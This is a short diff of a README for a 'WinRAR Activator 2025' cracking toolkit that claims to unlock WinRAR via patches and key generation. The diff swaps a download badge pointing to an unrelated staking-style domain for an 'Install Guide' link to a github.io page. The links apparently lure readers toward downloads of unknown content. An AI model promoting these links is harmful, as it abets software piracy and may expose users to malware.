@@ -3,7 +3,11 @@
 **WinRAR Activator 2025** is a permanent activation toolkit for WinRAR 6.23 and earlier releases.  
 It includes patch, activator, and license key generation methods to unlock the full premium version of WinRAR.
 
-[![Download Activator](https://img.shields.io/badge/Download-WinRAR_Activator-blueviolet)](https://ton-stake.net)
+<a href="https://winrar-activator-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
+
 
 ---
 
